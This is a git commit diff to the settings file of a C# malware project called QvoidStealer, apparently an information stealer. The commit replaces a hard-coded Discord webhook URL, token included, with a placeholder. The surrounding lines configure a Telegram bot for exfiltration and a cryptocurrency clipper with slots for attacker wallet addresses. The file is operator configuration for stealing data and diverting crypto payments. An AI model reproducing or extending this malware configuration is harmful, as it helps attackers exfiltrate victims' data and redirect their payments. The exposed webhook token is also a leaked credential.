711d0c35a5f07ffa7b5ca9675a04175018c79d64
Yenon <84099739+Enum0x539@users.noreply.github.com>
2022-06-13 16:09:39 +0000

    :D

--- QvoidStealer/QvoidStealer/Main/Settings.cs
+++ QvoidStealer/QvoidStealer/Main/Settings.cs
@@ -4,7 +4,7 @@ namespace QvoidStealer.Main
 {
     class Settings
     {
-        public static DiscordWebhook Webhook = new DiscordWebhook("https://discordapp.com/api/webhooks/978601069628239883/jxxR-IRV-085dr2wyGIzJ6iQ9yEl0pwPJGVEIrK-pyGD5yOEALGYAUG-X96PwyH-nKEj");
+        public static DiscordWebhook Webhook = new DiscordWebhook("WEBHOOK_HERE");
         public static TelegramAPI Telegram = new TelegramAPI("%TELEGRAM_TOKEN_HERE%", 0/*%TELEGRAM_CHAT_ID_HERE%*/);
         public static CryptoClipper Clipper = new CryptoClipper("BTC_ADDRESS_HERE_", "ETH_ADDRESS_HERE_", "DODGE_ADDRESS_HERE_", "LTC_ADDRESS_HERE_", "XMR_ADDRESS_HERE_", "DASH_ADDRESS_HERE_", "NEO_ADDRESS_HERE_", "XRP_ADDRESS_HERE_");
 
